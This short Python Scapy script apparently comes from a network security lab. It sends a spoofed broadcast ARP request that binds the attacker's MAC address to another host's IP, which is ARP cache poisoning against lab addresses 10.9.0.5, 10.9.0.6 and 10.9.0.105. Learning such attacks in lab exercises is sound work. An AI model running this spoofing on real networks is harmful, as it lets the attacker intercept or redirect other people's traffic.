from scapy.all import *

# MAC A: 02:42:0a:09:00:05
# IP A: 10.9.0.5
# MAC B: 02:42:0a:09:00:06
# IP B: 10.9.0.6
# MAC M: 02:42:0a:09:00:69
# IP M: 10.9.0.105

E = Ether(dst = 'ff:ff:ff:ff:ff:ff', src = '02:42:0a:09:00:69')
A = ARP(hwsrc = '02:42:0a:09:00:69', psrc = '10.9.0.6', hwdst = 'ff:ff:ff:ff:ff:ff', pdst = '10.9.0.6')
A.op = 1 # 1 for ARP request; 2 for ARP reply

pkt = E/A
pkt.show()
sendp(pkt)

